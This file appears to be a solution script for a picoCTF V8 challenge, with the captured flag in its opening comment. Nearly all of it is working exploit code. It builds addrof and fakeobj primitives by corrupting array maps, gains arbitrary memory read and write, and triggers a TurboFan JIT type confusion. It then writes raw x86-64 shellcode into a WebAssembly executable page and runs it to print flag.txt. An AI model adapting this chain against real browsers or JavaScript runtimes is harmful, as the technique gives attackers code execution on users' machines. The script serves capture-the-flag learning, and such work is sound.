/*
picoCTF{Good_job!_Now_go_find_a_real_v8_cve!_4f2661eab1a80e33}
*/

var buf = new ArrayBuffer(8);
var floatBuf = new Float64Array(buf);
var intBuf = new BigUint64Array(buf);

function ftoi(val) {
	floatBuf[0] = val;
	return intBuf[0];
}

function itof(val) {
	intBuf[0] = BigInt(val);
	return floatBuf[0];
}

function least32(val) {
	return val & 0xffffffffn;
}

function most32(val) {
	return val / 0x100000000n;
}

function readOffset(arr, i) {
	let curr = ftoi(arr[i>>1]);
	let res;
	if (i % 2 == 0) {
		res = least32(curr);
	} else {
		res = most32(curr);
	}
	// console.log("read " + i + " = 0x" + res.toString(16));
	return res;
}

function writeOffset(arr, i, v) {
	let curr = readOffset(arr, i ^ 1);
	if (i % 2 == 0) {
		// Modify least 32 bits
		curr = curr * 0x100000000n;
		curr += BigInt(v);
		// console.log("least " + curr.toString(16));
	} else {
		// Modify most 32 bits
		curr = curr;
		curr += BigInt(v) * 0x100000000n;
		// console.log("most " + curr.toString(16));
	}
	arr[i>>1] = itof(curr);
	// console.log("wrote 0x" + v.toString(16) + " to index " + i);
}

function addrof(in_obj) {
	// Move target object to obj_arr
	obj_arr[0] = in_obj;
	// Overwrite with a float map
	writeOffset(float_arr, 21, float_arr_map);
	// Read the address
	let addr = readOffset(obj_arr, 0);
	// Revert to object map
	writeOffset(float_arr, 21, obj_arr_map);
	// Return address
	return addr;
}

function fakeobj(addr) {
	// Move target address to mutate_arr
	mutate_arr[0] = itof(addr);
	// Overwrite with an object map
	writeOffset(float_arr, 74, obj_arr_map);
	// Get the "fake" object
	let fake = mutate_arr[0];
	// Revert to float map
	writeOffset(float_arr, 74, float_arr_map);
	// Return the object
	return fake;
}

function readOffset2(arr, i) {
	// console.log("read " + i);
	let curr = ftoi(arr[i>>1])
	if (i % 2 == 0) {
		return least32(curr);
	} else {
		return most32(curr);
	}
}

function writeOffset2(arr, i, v) {
	let curr = readOffset2(arr, i ^ 1);
	if (i % 2 == 0) {
		// Modify least 32 bits
		curr = curr * 0x100000000n;
		curr += BigInt(v);
		// console.log("least " + curr.toString(16));
	} else {
		// Modify most 32 bits
		curr = curr;
		curr += BigInt(v) * 0x100000000n;
		// console.log("most " + curr.toString(16));
	}
	arr[i>>1] = itof(curr);
}

function addrof2(in_obj) {
	// Move target object to obj_arr
	obj_arr[0] = in_obj;
	// Overwrite with a float map
	writeOffset2(float_arr, 21, float_arr_map);
	// Read the address
	let addr = readOffset2(obj_arr, 0);
	// Revert to object map
	writeOffset2(float_arr, 21, obj_arr_map);
	// Return address
	return addr;
}

function fakeobj2(addr) {
	// Move target address to mutate_arr
	mutate_arr[0] = itof(addr);
	// Overwrite with an object map
	writeOffset2(float_arr, 74, obj_arr_map);
	// Get the "fake" object
	let fake = mutate_arr[0];
	// Revert to float map
	writeOffset2(float_arr, 74, float_arr_map);
	// Return the object
	return fake;
}

function arbRead(addr) {
	// console.log("read " + addr.toString(16));
	addr = BigInt(addr);
	// v8 pointers are odd
	if (addr % 2n == 0n) addr += 1n;
	// "Create" a fake object with map of arb_rw_arr
	let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
	// Write the target address to the elments pointer of the "object"
	writeOffset(arb_rw_arr, 2, addr - 0x8n);
	// Read the first element (the target address)
	return readOffset(fake, 0);
}

function arbWrite(addr, v) {
	// console.log("write " + addr.toString(16) + " " + v.toString(16));
	addr = BigInt(addr);
	// v8 pointers are odd
	if (addr % 2n == 0n) addr += 1n;
	// "Create" a fake object with map of arb_rw_arr
	let fake = fakeobj2(addrof2(arb_rw_arr) - 0x20n);
	// Write the target address to the elments pointer of the "object"
	writeOffset2(arb_rw_arr, 2, addr - 0x8n);
	// Write to the first element (the target address)
	return writeOffset2(fake, 0, v);
}

// Below shellcode is taken from Kit Engine (1st challenge involving v8)
var shellcode = [0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xDB, 0x53, 0x48, 0xB9, 0x2F, 0x64, 0x65, 0x76, 0x2F, 0x74, 0x74, 0x79, 0x51, 0x54, 0x5F, 0x48, 0xBE, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x31, 0xD2, 0x52, 0x48, 0xB8, 0x3B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x63, 0x61, 0x74, 0x57, 0x54, 0x5F, 0x52, 0x48, 0xBB, 0x66, 0x6C, 0x61, 0x67, 0x2E, 0x74, 0x78, 0x74, 0x53, 0x48, 0xBB, 0x61, 0x72, 0x67, 0x31, 0x00, 0x00, 0x00, 0x00, 0x53, 0x54, 0x59, 0x48, 0x83, 0xE9, 0x18, 0x48, 0x89, 0xCE, 0x52, 0x48, 0x83, 0xC1, 0x20, 0x51, 0x48, 0x83, 0xE9, 0x08, 0x51, 0x0F, 0x05, 0xC9, 0xC3];

function writeShellcode(addr, v) {
	buf = new ArrayBuffer(512);
	dataview = new DataView(buf);
	let buf_addr = addrof(buf);
	console.log("buf: " + buf_addr.toString(16));
	let backing_store_addr = buf_addr + 0x18n;
	arbWrite(backing_store_addr, most32(addr));
	arbWrite(backing_store_addr - 4n, least32(addr));
	console.log("writes done");
	for (let i = 0; i < shellcode.length; i++) {
		dataview.setUint8(i, shellcode[i]);
	}
}

/*
-----------------------------------------------------------------------------------
BEGIN NEW FUNCTIONS FOR TURBOFLAN
-----------------------------------------------------------------------------------
*/

class RealObj {
	constructor() {
		this.a = 1;
		this.b = 2;
		this.c = 3;
		this.d = 4;
		this.e = 5;
		this.f = 6;
		this.g = 7;
		this.h = 8;
		this.i = 9;
		this.j = 10;
		this.k = 11;
		this.l = 12;
		this.m = 13;
		this.n = 14;
		this.o = 15;
		this.p = 16;
		this.q = 17;
		this.r = 18;
		this.s = 19;
		this.t = 20;
		this.u = 21;
		this.v = 22;
		this.w = 23;
		this.x = 24;
		this.y = 25;
		this.z = 26;
		this.a1 = 27;
		this.b1 = 28;
		this.c1 = 29;
		this.d1 = 30;
		this.e1 = 31;
		this.f1 = 32;
		this.g1 = 33;
		this.h1 = 34;
		this.i1 = 35;
		this.j1 = 36;
		this.k1 = 37;
		this.l1 = 38;
		this.m1 = 39;
		this.n1 = 40;
		this.o1 = 41;
		this.p1 = 42;
		this.q1 = 43;
		this.r1 = 44;
		this.s1 = 45;
		this.t1 = 46;
		this.u1 = 47;
		this.v1 = 48;
		this.w1 = 49;
		this.x1 = 50;
		this.y1 = 51;
		this.z1 = 52;
	}
}

class FakeObj {
	constructor() {}
}

function changeLength(obj) {
	// obj.n1 = 0x100; //0x1337;
	// obj.t1 = 0x100;
	// obj.u1 = 0x100;
	obj.v1 = 0x100;
	// obj.w1 = 0x100;
}

var codefunc = function() {
	return 1;
}

class ExploitObj {
	constructor() {
		this.fake_obj = new FakeObj();
		this.float_arr = [1.1, 2.2];
		this.obj_arr = [codefunc];
		this.arb_rw = new ArrayBuffer(4);
		this.mutate_arr = [3.3, 4.4];
	}
}

function turboInitExp() {
	// Create object so memory offsets are fixed
	tempobj = new ExploitObj();
	fake_obj = tempobj.fake_obj;
	float_arr = tempobj.float_arr;
	obj_arr = tempobj.obj_arr;
	arb_rw = tempobj.arb_rw;
	mutate_arr = tempobj.mutate_arr;

	// Abuse wrong maps to change length of the float array
	real_obj = new RealObj();
	print('JIT setProp() function')
	for (let i = 0; i < 0x10000; i++) changeLength(real_obj);

	print('Changing length of float_arr')
	changeLength(fake_obj);
	// %DebugPrint(fake_obj);
	// %DebugPrint(float_arr);
	// Breakpoint();
}

/*
-----------------------------------------------------------------------------------
END NEW FUNCTIONS FOR TURBOFLAN
-----------------------------------------------------------------------------------
*/

function initExp() {
	turboInitExp();

	// Get maps
	float_arr_map = readOffset(float_arr, 4);
	obj_arr_map = readOffset(float_arr, 21);     // was 38
	// mutate_arr_map = readOffset(float_arr, 74);  // was 86

	// Setup arbitrary read and write primitives
	arb_rw_arr = [1.1, 1.2, 1.3, 1.4];
	writeOffset(arb_rw_arr, 0, float_arr_map);

	console.log("Float arr map: 0x" + float_arr_map.toString(16));
	console.log("Object arr map: 0x" + obj_arr_map.toString(16));
	// console.log("Mutate arr map: 0x" + mutate_arr_map.toString(16));

	// console.log("Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));
	// console.log("Controlled object array: 0x" + addrof(obj_arr).toString(16));
	// console.log("Controlled mutate array: 0x" + addrof(mutate_arr).toString(16));
}

function exploit() {
	codefunc();
	initExp();

	// js_function = addrof(codefunc);
	// console.log("js_function: 0x" + js_function.toString(16));

	// code_addr = arbRead(js_function + 56n);
	// console.log("code_addr: 0x" + code_addr.toString(16));

	// shellcode_addr = code_addr + 128n;
	// console.log("shellcode_addr: 0x" + shellcode_addr.toString(16));

	// https://wasdk.github.io/WasmFiddle/
	wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	wasm_mod = new WebAssembly.Module(wasm_code);
	wasm_instance = new WebAssembly.Instance(wasm_mod);
	f = wasm_instance.exports.main;

	// Find address (got from brute-forcing in gdb)
	wasm_addr = addrof(wasm_instance);
	rwx_page_addr = arbRead(wasm_addr+0x6bn) * 0x100000000n + arbRead(wasm_addr+0x67n);
	console.log("wasm_addr: 0x" + wasm_addr.toString(16));
	// writeOffset(float_arr, 86, 0x31313131);
	console.log("rwx_page_addr: 0x" + rwx_page_addr.toString(16));

	writeShellcode(rwx_page_addr);
	console.log("Shellcode written");
	f();

	// Overwrite obj_arr's map to float_arr_map
	// %DebugPrint(float_arr);
	// %DebugPrint(obj_arr);
	// writeOffset(float_arr, 0, 0x14141414);
	// writeOffset(float_arr, 1, 0x15151515);
	// writeOffset(float_arr, 38, float_arr_map)
	// Breakpoint();

	// writeOffset32(obj_arr, 4, float_arr_map);
	// writeOffset32(obj_arr, 1, float_arr_map);
	// Breakpoint();
	// console.log("0x" + ftoi(obj_arr[1]).toString(16));

	// printData(obj_arr, 0, 1);
	// %DebugPrint(float_arr);
	// %DebugPrint(obj);
	// printData(float_arr, 0, 20);
	// printData(obj_arr, 0, 20);

	// %DebugPrint(tempobj);
	// %DebugPrint(code);
	// %DebugPrint(obj_arr);
	// console.log("float_arr_map: 0x" + float_arr_map.toString(16));
}

exploit();
// Breakpoint();